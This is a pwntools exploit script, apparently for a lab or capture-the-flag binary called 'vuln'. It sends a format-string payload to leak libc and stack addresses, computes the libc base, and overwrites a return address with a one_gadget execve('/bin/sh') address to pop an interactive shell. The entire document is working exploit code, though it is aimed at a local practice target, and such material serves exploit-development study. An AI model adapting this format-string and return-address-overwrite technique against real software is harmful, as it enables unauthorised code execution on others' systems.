from pwn import *

elf = ELF("vuln")
libc = ELF("libc.so.6")

gdb_env = {
    "LD_PRELOAD":"/home/user/Desktop/VDSI/FS_ONEGADGET/libc.so.6"
}

#  gef config context.nb_lines_stack 100
gdb_commands = '''
# debug automatically breaks at _start - ignore it
b *vuln+98
b *vuln +233
continue
'''

p = gdb.debug('./vuln', gdbscript=gdb_commands,env=gdb_env)

p.sendline(b"%13$p %17$p")

p.recvuntil(b"Hi: ")

line = p.recvline().split(b" ")

libc_leak = int(line[0],16)
stack_leak = int(line[1],16)

print(hex(libc_leak), hex(stack_leak))


stack_ret = stack_leak + 8 # - 2842 # + 3274 # - 112 
libc_base = libc_leak - libc.symbols["puts"] - 362

# 0x00007ffe95ce3fc2   0x00007ffe95ce29b8
print("stak leak: ", hex(stack_leak))
print("libc base: ", hex(libc_base))
print("stak ret: ", hex(stack_ret))


# 0xeacec execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
# 
# 0xeacef execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
# 
# 0xeacf2 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

one_gadgets = [0xeacec, 0xeacef, 0xeacf2]


print(libc_base + one_gadgets[2])
print(stack_ret)
p.sendline(str(libc_base + 0xeacf2).encode("utf-8"))
p.sendline(str(stack_ret).encode("utf-8"))

p.interactive()